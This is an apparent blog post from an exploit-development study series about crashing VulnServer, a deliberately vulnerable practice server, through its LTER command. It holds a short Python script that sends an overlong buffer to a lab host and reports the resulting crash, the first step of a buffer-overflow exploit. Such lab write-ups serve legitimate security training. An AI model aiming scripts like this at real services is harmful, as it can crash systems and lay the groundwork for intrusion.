---
layout: post
title:  "[VulnServer] Exploiting LTER Command using Restricted Characters"
date:   2018-06-30
categories: [exploitdev, osceprep]
---

The following skeleton was used for the exploitation of the `LTER` command.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Sending this code caused the application to crash.
![Crash](/static/img/06/01.png)
